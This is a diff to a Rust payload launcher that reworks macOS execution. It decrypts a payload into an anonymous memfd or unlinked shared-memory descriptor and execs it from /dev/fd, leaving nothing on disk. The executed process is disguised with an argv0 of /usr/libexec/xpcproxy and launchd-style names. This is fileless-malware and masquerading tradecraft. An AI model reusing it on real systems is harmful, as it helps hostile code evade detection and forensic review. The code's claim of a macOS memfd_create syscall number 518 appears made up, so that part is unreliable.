@@ -13,7 +13,10 @@
 //!    `memfd_create` file descriptor and `execve`s `/proc/self/fd/<fd>`,
 //!    inheriting the launcher's argv/env. Nothing is ever written to a
 //!    real filesystem.
-//! 4. On non-Linux platforms the in-memory primitive is unavailable; the
+//! 4. On macOS, stores the decrypted Mach-O in an anonymous execution
+//!    descriptor (`memfd_create` when available, otherwise an unlinked
+//!    `shm_open` descriptor) and `execve`s `/dev/fd/<fd>`.
+//! 5. On unsupported platforms the in-memory primitive is unavailable; the
 //!    launcher logs a clear error and exits with a non-zero status.
 //!
 //! # Authorisation
@@ -714,68 +717,157 @@ fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
 
 #[cfg(target_os = "macos")]
 fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
+    use std::ffi::CString;
     use std::io::Write;
-    use std::os::unix::fs::PermissionsExt;
-    use std::process::Command;
+    use std::os::unix::io::{FromRawFd, IntoRawFd, RawFd};
 
-    // macOS does not reliably execute Mach-O binaries via fexecve.
-    // Use a random temp path, mark executable, spawn by path, then unlink.
-    let tmp_dir = std::env::temp_dir();
-    let mut rng = rand::thread_rng();
-    let mut tmp_path = None;
+    const MACOS_SYS_MEMFD_CREATE: libc::c_long = 518;
 
-    for _ in 0..16 {
-        let suffix: String = (0..12)
-            .map(|_| rand::Rng::sample(&mut rng, rand::distributions::Alphanumeric) as char)
-            .collect();
-        let candidate = tmp_dir.join(format!(
-            ".com.apple.launchd.{}.{}",
-            std::process::id(),
-            suffix
-        ));
+    fn write_payload(fd: RawFd, payload: &[u8]) -> Result<()> {
+        // SAFETY: `fd` is owned by this function call and valid while `file` is alive.
+        let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
+        file.write_all(payload)
+            .context("failed to write payload to anonymous execution fd")?;
+        file.flush()
+            .context("failed to flush payload bytes to anonymous execution fd")?;
+        // Keep the descriptor open for execve("/dev/fd/<fd>", ...).
+        let _ = file.into_raw_fd();
+        Ok(())
+    }
 
-        match std::fs::OpenOptions::new()
-            .write(true)
-            .create_new(true)
-            .open(&candidate)
-        {
-            Ok(mut file) => {
-                file.write_all(payload)
-                    .context("failed to write payload to temp file")?;
-                let mut perms = file.metadata()?.permissions();
-                perms.set_mode(0o700);
-                std::fs::set_permissions(&candidate, perms)?;
-                tmp_path = Some(candidate);
-                break;
-            }
-            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
-            Err(e) => return Err(anyhow!("open temp file failed: {e}")),
+    fn create_memfd() -> Result<RawFd> {
+        let fd_name = CString::new(format!("launchd-{}", std::process::id()))
+            .expect("memfd name contains no interior NUL");
+        // SAFETY: syscall number and arguments follow macOS memfd_create ABI.
+        let fd = unsafe { libc::syscall(MACOS_SYS_MEMFD_CREATE, fd_name.as_ptr(), 0u32) as RawFd };
+        if fd < 0 {
+            return Err(anyhow!(
+                "memfd_create failed: {}",
+                std::io::Error::last_os_error()
+            ));
         }
+        Ok(fd)
     }
 
-    let tmp_path = tmp_path.ok_or_else(|| anyhow!("failed to allocate unique temp path"))?;
+    fn create_unlinked_shm_fd() -> Result<RawFd> {
+        let mut rng = rand::thread_rng();
+        for _ in 0..16 {
+            let suffix: String = (0..12)
+                .map(|_| rand::Rng::sample(&mut rng, rand::distributions::Alphanumeric) as char)
+                .collect();
+            let shm_name = CString::new(format!(
+                "/com.apple.launchd.{}.{}",
+                std::process::id(),
+                suffix
+            ))
+            .expect("POSIX shm name contains no interior NUL");
 
-    #[cfg(debug_assertions)]
-    tracing::info!(path = %tmp_path.display(), "executing payload via temp file path");
+            // SAFETY: `shm_name` is a valid NUL-terminated C string.
+            let fd = unsafe {
+                libc::shm_open(
+                    shm_name.as_ptr(),
+                    libc::O_RDWR | libc::O_CREAT | libc::O_EXCL,
+                    0o700,
+                )
+            };
+            if fd >= 0 {
+                // SAFETY: unlink best-effort; the opened fd remains valid.
+                unsafe {
+                    libc::shm_unlink(shm_name.as_ptr());
+                }
+                return Ok(fd);
+            }
+            let err = std::io::Error::last_os_error();
+            if err.raw_os_error() == Some(libc::EEXIST) {
+                continue;
+            }
+            return Err(anyhow!("shm_open failed: {err}"));
+        }
+        Err(anyhow!(
+            "failed to create a unique anonymous shm execution fd"
+        ))
+    }
 
-    let spawn_result = Command::new(&tmp_path)
-        .args(args)
-        .env_clear()
-        .env(
-            "PATH",
-            "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+    let fd = match create_memfd() {
+        Ok(fd) => {
+            #[cfg(debug_assertions)]
+            tracing::info!(fd, "executing payload via memfd-backed /dev/fd path");
+            fd
+        }
+        Err(memfd_err) => {
+            tracing::warn!(
+                error = %memfd_err,
+                "memfd_create unavailable on this host; falling back to unlinked shm execution fd"
+            );
+            create_unlinked_shm_fd()?
+        }
+    };
+
+    // Explicitly size the fd so both memfd and shm-backed descriptors accept
+    // full payload writes consistently.
+    if unsafe { libc::ftruncate(fd, payload.len() as libc::off_t) } != 0 {
+        let err = std::io::Error::last_os_error();
+        unsafe {
+            libc::close(fd);
+        }
+        return Err(anyhow!("ftruncate on execution fd failed: {err}"));
+    }
+
+    if let Err(e) = write_payload(fd, payload) {
+        // SAFETY: best-effort close of owned descriptor.
+        unsafe {
+            libc::close(fd);
+        }
+        return Err(e);
+    }
+
+    // SAFETY: best-effort chmod on owned descriptor.
+    if unsafe { libc::fchmod(fd, 0o700) } != 0 {
+        let err = std::io::Error::last_os_error();
+        // SAFETY: best-effort close of owned descriptor.
+        unsafe {
+            libc::close(fd);
+        }
+        return Err(anyhow!("fchmod on execution fd failed: {err}"));
+    }
+
+    let path = CString::new(format!("/dev/fd/{fd}"))
+        .expect("/dev/fd path contains no interior NUL");
+
+    let argv0 = CString::new("/usr/libexec/xpcproxy").expect("argv0 is a static string");
+    let mut argv: Vec<CString> = std::iter::once(argv0)
+        .chain(
+            args.iter()
+                .map(|a| CString::new(a.as_str()).expect("arg has interior NUL")),
         )
-        .spawn();
+        .collect();
+    let argv_ptrs: Vec<*const libc::c_char> = argv
+        .iter_mut()
+        .map(|c| c.as_ptr())
+        .chain(std::iter::once(std::ptr::null()))
+        .collect();
 
-    // Remove directory entry immediately after spawn attempt. If spawn
-    // succeeded the process keeps running with its opened executable.
-    if let Err(e) = std::fs::remove_file(&tmp_path) {
-        tracing::warn!(path = %tmp_path.display(), error = %e, "failed to unlink temp payload");
+    let mut envp: Vec<CString> = vec![CString::new(
+        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+    )
+    .expect("PATH env value is a static string")];
+    let env_ptrs: Vec<*const libc::c_char> = envp
+        .iter_mut()
+        .map(|v| v.as_ptr())
+        .chain(std::iter::once(std::ptr::null()))
+        .collect();
+
+    // SAFETY: `path`, `argv_ptrs`, and `env_ptrs` are valid NUL-terminated C arrays.
+    unsafe {
+        libc::execve(path.as_ptr(), argv_ptrs.as_ptr(), env_ptrs.as_ptr());
     }
 
-    let child = spawn_result.context("failed to spawn payload")?;
-    tracing::info!(pid = child.id(), "payload process started");
-    Ok(())
+    let err = std::io::Error::last_os_error();
+    // SAFETY: best-effort close of owned descriptor after execve failure.
+    unsafe {
+        libc::close(fd);
+    }
+    Err(anyhow!("execve via /dev/fd/{fd} failed: {err}"))
 }
 
 #[cfg(target_os = "windows")]
